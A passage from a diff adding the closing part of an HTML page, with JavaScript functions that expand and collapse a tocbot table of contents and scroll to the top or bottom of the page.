+    collapseDepth: 6,
+    orderedList: false,
+    scrollSmooth: false,
+  });
+  b.setAttribute("onclick", "collapse_toc()");
+  b.innerHTML = "Collapse all"
+}
+
+function collapse_toc(){
+  var b = document.querySelector(".book-toc-expand");
+  tocbot.init({
+    tocSelector: '.book-tocbot',
+    contentSelector: '.book-post',
+    headingSelector: 'h1, h2, h3, h4, h5',
+    collapseDepth: 2,
+    orderedList: false,
+    scrollSmooth: false,
+  });
+  b.setAttribute("onclick", "expand_toc()");
+  b.innerHTML = "Expand all"
+}
+
+function go_top() {
+  window.scrollTo(0, 0);
+}
+
+function go_bottom() {
+  window.scrollTo(0, document.body.scrollHeight);
+}
+
+</script>
+      </div>
+    </div>
+  </div>
+</div>
+
+</body>
+</html>
